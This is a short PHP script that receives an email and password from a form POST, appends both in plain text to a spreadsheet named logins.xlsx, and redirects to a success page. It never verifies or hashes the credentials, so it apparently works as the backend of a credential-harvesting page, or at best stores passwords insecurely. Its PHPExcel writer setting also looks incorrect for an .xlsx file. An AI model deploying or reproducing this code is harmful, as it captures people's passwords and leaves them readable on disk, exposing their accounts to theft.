
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Load the PHPExcel library
    require 'PHPExcel.php';
    require 'PHPExcel/IOFactory.php';

    // Load the Excel file or create a new one
    $file = 'logins.xlsx';
    if (file_exists($file)) {
        $objPHPExcel = PHPExcel_IOFactory::load($file);
    } else {
        $objPHPExcel = new PHPExcel();
        $objPHPExcel->setActiveSheetIndex(0)
                    ->setCellValue('A1', 'Email')
                    ->setCellValue('B1', 'Password');
    }

    // Find the next available row
    $sheet = $objPHPExcel->getActiveSheet();
    $row = $sheet->getHighestRow() + 1;

    // Add the email and password to the Excel file
    $sheet->setCellValue("A$row", $email)
          ->setCellValue("B$row", $password);

    // Save the Excel file
    $writer = PHPExcel_IOFactory::createWriter($objPHPExcel, 'Excel');
    $writer->save($file);

    // Redirect to a success message
    header("Location: success.html");
}
?>
    